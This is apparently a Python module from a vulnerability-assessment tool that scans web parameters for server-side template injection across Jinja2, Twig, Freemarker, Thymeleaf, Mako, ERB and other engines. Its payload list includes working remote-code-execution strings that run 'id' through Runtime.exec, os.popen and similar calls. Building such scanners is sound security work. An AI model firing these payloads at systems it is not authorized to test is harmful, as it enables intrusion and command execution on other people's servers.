"""
Lynx VAPT - Server-Side Template Injection (SSTI) Scanner

Tests for template injection vulnerabilities in various template engines:
- Jinja2 (Python)
- Twig (PHP)
- Smarty (PHP)
- Freemarker (Java)
- Velocity (Java)
- Thymeleaf (Java)
- Pebble (Java)
- Go templates
- ERB (Ruby)
- Mako (Python)

Author: Lynx Team
"""

import asyncio
import re
import urllib.parse
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

from scanners.base import BaseScanner
from common import event_manager, TestingZone


@dataclass
class SSTIPayload:
    """Template injection payload configuration."""
    engine: str
    payload: str
    expected_output: str
    severity: str = "P1"
    description: str = ""
    rce_capable: bool = False


class SSTIScanner(BaseScanner):
    """
    Server-Side Template Injection Scanner.
    
    Detects SSTI vulnerabilities in multiple template engines using
    arithmetic and expression payloads.
    
    Detection strategy:
    1. Inject arithmetic expressions (7*7, 7*'7')
    2. Check for evaluated output (49, 7777777)
    3. Identify specific template engine
    4. Attempt RCE confirmation
    """
    
    # SSTI payloads organized by template engine
    PAYLOADS: List[SSTIPayload] = [
        # Universal detection (polyglot)
        SSTIPayload(
            engine="Universal",
            payload="${7*7}{{7*7}}#{7*7}",
            expected_output="49",
            description="Polyglot payload for detecting SSTI"
        ),
        
        # Jinja2 (Python Flask, Django)
        SSTIPayload(
            engine="Jinja2",
            payload="{{7*7}}",
            expected_output="49",
            description="Jinja2 basic expression"
        ),
        SSTIPayload(
            engine="Jinja2",
            payload="{{7*'7'}}",
            expected_output="7777777",
            description="Jinja2 string multiplication (distinguishes from Twig)"
        ),
        SSTIPayload(
            engine="Jinja2",
            payload="{{config}}",
            expected_output="Config",
            description="Jinja2 config object access"
        ),
        SSTIPayload(
            engine="Jinja2",
            payload="{{config.items()}}",
            expected_output="SECRET",
            description="Jinja2 config enumeration",
            rce_capable=True
        ),
        SSTIPayload(
            engine="Jinja2",
            payload="{{''.__class__.__mro__}}",
            expected_output="class",
            description="Jinja2 class hierarchy access",
            rce_capable=True
        ),
        
        # Twig (PHP)
        SSTIPayload(
            engine="Twig",
            payload="{{7*7}}",
            expected_output="49",
            description="Twig basic expression"
        ),
        SSTIPayload(
            engine="Twig",
            payload="{{7*'7'}}",
            expected_output="49",
            description="Twig multiplication (different from Jinja2)"
        ),
        SSTIPayload(
            engine="Twig",
            payload="{{_self.env.getExtension('Twig_Extension_Core')}}",
            expected_output="Twig",
            description="Twig environment access"
        ),
        
        # Smarty (PHP)
        SSTIPayload(
            engine="Smarty",
            payload="{math equation=\"7*7\"}",
            expected_output="49",
            description="Smarty math function"
        ),
        SSTIPayload(
            engine="Smarty",
            payload="{$smarty.version}",
            expected_output="Smarty",
            description="Smarty version disclosure"
        ),
        SSTIPayload(
            engine="Smarty",
            payload="{php}echo 'SSTI';{/php}",
            expected_output="SSTI",
            description="Smarty PHP code execution",
            rce_capable=True
        ),
        
        # Freemarker (Java)
        SSTIPayload(
            engine="Freemarker",
            payload="${7*7}",
            expected_output="49",
            description="Freemarker basic expression"
        ),
        SSTIPayload(
            engine="Freemarker",
            payload="${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            expected_output="uid=",
            description="Freemarker RCE",
            rce_capable=True
        ),
        SSTIPayload(
            engine="Freemarker",
            payload="<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            expected_output="uid=",
            description="Freemarker RCE via assign",
            rce_capable=True
        ),
        
        # Velocity (Java)
        SSTIPayload(
            engine="Velocity",
            payload="#set($x=7*7)$x",
            expected_output="49",
            description="Velocity basic expression"
        ),
        SSTIPayload(
            engine="Velocity",
            payload="$class.inspect(\"java.lang.Runtime\")",
            expected_output="Runtime",
            description="Velocity class inspection",
            rce_capable=True
        ),
        
        # Thymeleaf (Java Spring)
        SSTIPayload(
            engine="Thymeleaf",
            payload="${7*7}",
            expected_output="49",
            description="Thymeleaf basic expression"
        ),
        SSTIPayload(
            engine="Thymeleaf",
            payload="${T(java.lang.Runtime).getRuntime().exec('id')}",
            expected_output="Process",
            description="Thymeleaf RCE",
            rce_capable=True
        ),
        
        # Pebble (Java)
        SSTIPayload(
            engine="Pebble",
            payload="{{7*7}}",
            expected_output="49",
            description="Pebble basic expression"
        ),
        SSTIPayload(
            engine="Pebble",
            payload="{{['id']|join}}",
            expected_output="id",
            description="Pebble array join"
        ),
        
        # Go templates
        SSTIPayload(
            engine="Go",
            payload="{{.}}",
            expected_output="",  # Any output indicates template processing
            description="Go template context access"
        ),
        SSTIPayload(
            engine="Go",
            payload="{{printf \"%d\" 49}}",
            expected_output="49",
            description="Go template printf"
        ),
        
        # ERB (Ruby)
        SSTIPayload(
            engine="ERB",
            payload="<%=7*7%>",
            expected_output="49",
            description="ERB basic expression"
        ),
        SSTIPayload(
            engine="ERB",
            payload="<%=`id`%>",
            expected_output="uid=",
            description="ERB command execution",
            rce_capable=True
        ),
        
        # Mako (Python)
        SSTIPayload(
            engine="Mako",
            payload="${7*7}",
            expected_output="49",
            description="Mako basic expression"
        ),
        SSTIPayload(
            engine="Mako",
            payload="<%import os;x=os.popen('id').read()%>${x}",
            expected_output="uid=",
            description="Mako RCE",
            rce_capable=True
        ),
        
        # EL (Expression Language - Java)
        SSTIPayload(
            engine="Expression Language",
            payload="${7*7}",
            expected_output="49",
            description="EL basic expression"
        ),
        SSTIPayload(
            engine="Expression Language",
            payload="#{7*7}",
            expected_output="49",
            description="EL alternate syntax"
        ),
        
        # Handlebars (JavaScript)
        SSTIPayload(
            engine="Handlebars",
            payload="{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
            expected_output="function",
            description="Handlebars prototype access",
            rce_capable=True
        ),
    ]
    
    # Detection payloads (simpler, for initial detection)
    DETECTION_PAYLOADS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%=7*7%>", "49"),
        ("{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
    ]
    
    def __init__(self, context):
        super().__init__(context)
        self.name = "SSTIScanner"
        self.zone = TestingZone.ZONE_A  # Input/Output Validation
        self.detected_engines: Dict[str, int] = {}
    
    async def run(self):
        """Run SSTI vulnerability scan."""
        await event_manager.emit("log", f"[{self.name}] Starting SSTI scan...")
        
        # Get URLs with parameters
        urls_to_test = list(self.context.crawled_urls)
        if not urls_to_test:
            urls_to_test = [self.context.target]
        
        # Filter for URLs with parameters
        param_urls = [u for u in urls_to_test if '?' in u]
        
        if not param_urls:
            # Try target with common parameters
            await self._test_common_params(self.context.target)
        else:
            for url in param_urls[:20]:  # Limit to 20 URLs
                await self._test_url(url)
        
        if self.detected_engines:
            await event_manager.emit("log", 
                f"[{self.name}] Detected engines: {self.detected_engines}")
    
    async def _test_url(self, url: str):
        """Test a URL for SSTI vulnerabilities."""
        # Parse URL and get parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        # First, get baseline response
        try:
            async with self.context.session.get(url) as response:
                baseline = await response.text()
                baseline_length = len(baseline)
        except Exception:
            return
        
        # Test each parameter
        for param_name in params:
            await self._test_parameter(url, param_name, baseline)
    
    async def _test_parameter(self, url: str, param_name: str, baseline: str):
        """Test a specific parameter for SSTI."""
        # Phase 1: Quick detection
        for payload, expected in self.DETECTION_PAYLOADS:
            result = await self._inject_and_check(url, param_name, payload, expected)
            if result:
                await event_manager.emit("log", 
                    f"[{self.name}] Potential SSTI in {param_name} with {payload[:20]}...")
                
                # Phase 2: Engine identification
                engine = await self._identify_engine(url, param_name)
                
                # Phase 3: Confirm with full payloads
                await self._confirm_ssti(url, param_name, engine)
                return  # Found SSTI, no need to test more payloads
    
    async def _inject_and_check(
        self,
        url: str,
        param_name: str,
        payload: str,
        expected: str
    ) -> bool:
        """Inject payload and check for expected output."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        # Inject payload
        params[param_name] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        injected_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        
        try:
            async with self.context.session.get(injected_url, timeout=10) as response:
                text = await response.text()
                
                # Check if expected output is in response
                if expected in text:
                    # Verify it's not a coincidence (not in original URL)
                    if expected not in url and expected not in payload:
                        return True
                
                # For outputs like "49", ensure it's the evaluated result
                if expected == "49":
                    # Check if 49 appears as standalone number (not part of larger number)
                    if re.search(r'\b49\b', text):
                        # Make sure 49 wasn't in original request
                        if '49' not in url:
                            return True
                
        except Exception:
            pass
        
        return False
    
    async def _identify_engine(self, url: str, param_name: str) -> str:
        """Identify the specific template engine."""
        # Test engine-specific payloads
        engine_tests = [
            ("{{7*'7'}}", "7777777", "Jinja2"),
            ("{{7*'7'}}", "49", "Twig"),
            ("{math equation=\"7*7\"}", "49", "Smarty"),
            ("#set($x=7*7)$x", "49", "Velocity"),
            ("<%=7*7%>", "49", "ERB"),
            ("{{printf \"%d\" 49}}", "49", "Go"),
        ]
        
        for payload, expected, engine in engine_tests:
            result = await self._inject_and_check(url, param_name, payload, expected)
            if result:
                self.detected_engines[engine] = self.detected_engines.get(engine, 0) + 1
                return engine
        
        return "Unknown"
    
    async def _confirm_ssti(self, url: str, param_name: str, engine: str):
        """Confirm SSTI and report."""
        # Get matching payloads for this engine
        engine_payloads = [p for p in self.PAYLOADS if p.engine == engine or engine == "Unknown"]
        
        rce_confirmed = False
        confirmed_payloads = []
        
        for payload_info in engine_payloads:
            result = await self._inject_and_check(
                url, param_name,
                payload_info.payload,
                payload_info.expected_output
            )
            
            if result:
                confirmed_payloads.append(payload_info)
                if payload_info.rce_capable and payload_info.expected_output in ['uid=', 'root:']:
                    rce_confirmed = True
        
        if confirmed_payloads:
            # Determine severity
            severity = "P1" if rce_confirmed else "P2" if any(p.rce_capable for p in confirmed_payloads) else "P2"
            
            # Build details
            payloads_str = "\n".join([
                f"  - {p.payload[:50]}... ({p.description})"
                for p in confirmed_payloads[:5]
            ])
            
            await self.emit_vulnerability(
                f"SSTI ({engine})" if engine != "Unknown" else "Server-Side Template Injection",
                f"Server-Side Template Injection detected in parameter '{param_name}'.\n"
                f"Template Engine: {engine}\n"
                f"RCE Possible: {'Yes' if rce_confirmed else 'Potentially' if any(p.rce_capable for p in confirmed_payloads) else 'No'}\n"
                f"Working Payloads:\n{payloads_str}",
                severity=severity,
                remediation="Never pass user input directly to template engines. "
                           "Use proper input validation and escape user data before rendering.",
                url=url,
                payload=confirmed_payloads[0].payload
            )
    
    async def _test_common_params(self, base_url: str):
        """Test common parameters that might be vulnerable."""
        common_params = [
            "name", "template", "tmpl", "page", "view", "render",
            "message", "msg", "text", "content", "title", "query",
            "search", "q", "keyword", "id", "file", "path"
        ]
        
        for param in common_params:
            test_url = f"{base_url}?{param}=test"
            await self._test_url(test_url)
    
    def cleanup(self):
        """Cleanup scanner resources."""
        self.detected_engines.clear()
